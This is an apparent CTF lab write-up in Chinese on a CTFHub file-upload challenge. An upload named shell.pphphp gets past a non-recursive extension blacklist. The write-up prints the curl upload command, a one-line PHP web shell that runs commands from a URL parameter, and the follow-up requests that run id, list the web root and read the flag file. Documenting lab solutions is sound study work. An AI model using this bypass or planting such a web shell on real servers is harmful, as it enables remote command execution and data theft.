---
layout: writeup
tags: [ctfhub]

title: "CTFHub CTF Writeup - 双写后缀"
date: 2026-10-28

skill: "web-upload/双写后缀"
completed: true
---

# CTFHub Writeup - 双写后缀

## 题目类型

Web

## 题目描述

CTFHub 文件上传——双写绕过
Filename: 未选择文件


## 解题过程

<br>1. 上传阶段记录的命令为：curl.exe -s -F "file=@shell.pphphp;type=application/octet-stream" -F "submit=Submit" http://.../；返回页面提示上传成功，并显示相对路径 upload/shell.php。
<br>2. 上传文件内容为 \<?php echo shell\_exec($\_GET\["c"\]); ?\>，通过 c 参数执行系统命令。
<br>3. 随后请求 http://.../upload/shell.php?c=id，返回 uid=33(www-data) gid=33(www-data) groups=33(www-data)，说明命令执行生效。
<br>4. 继续通过 ?c=ls -la /var/www/html 枚举 Web 根目录，在返回列表中看到 flag\_777016488.php。
<br>5. 再请求 ?c=cat /var/www/html/flag\_777016488.php，返回内容为 \<?php // ctfhub\{8a179ea6dc8f2049a463c686\}，取得 flag。

## 疑问与解答

### 1.

<br>问题：为什么提交 shell.pphphp 后返回路径显示为 upload/shell.php？
<br>解答：双写绕过通常针对非递归的后缀黑名单过滤；若服务端把匹配到的 php 子串删除或替换为空，pphphp 经过一次处理后可能变成 php，因此最终文件名可能变为 shell.php。具体过滤实现仍需以服务端代码为准。

### 2.

<br>问题：上传成功后如何确认已经获得命令执行能力？
<br>解答：可请求上传后的脚本并传入简单系统命令，例如 c=id；若返回当前 Web 进程的用户和组信息，就说明命令执行生效。

### 3.

<br>问题：拿到命令执行后如何定位 flag？
<br>解答：可先枚举常见 Web 根目录，例如 ls -la /var/www/html，再读取文件名可疑的目标文件；本题记录中通过该方式找到并读取了 flag 文件。


## 本题的核心逻辑：



<br>本题的核心是文件上传后缀黑名单过滤不严，可通过双写危险后缀绕过。

<br>记录中 shell.pphphp 被落盘为 shell.php，推测服务端对文件名中的 php 子串做了非递归删除或替换；这种不循环检查的过滤会留下可被再次拼接出的危险后缀。

<br>上传的 PHP 文件提供 shell\_exec($\_GET\['c'\]) 的命令执行能力，可通过参数执行系统命令并读取服务器文件。


## 笔记

这道题主要学习了：

<br>1. 双写绕过的关键观察点是上传文件名与最终落盘文件名的差异：记录中提交 shell.pphphp，返回路径为 upload/shell.php。
<br>2. 验证 WebShell 时可用简单系统命令如 id 确认执行权限和运行用户，再通过目录枚举与文件读取定位 flag。
<br>3. 文件上传题应同时关注前端验证、MIME、后缀黑名单、文件内容解析和最终落盘路径；本题的落盘路径由响应给出，后续利用依赖该路径。
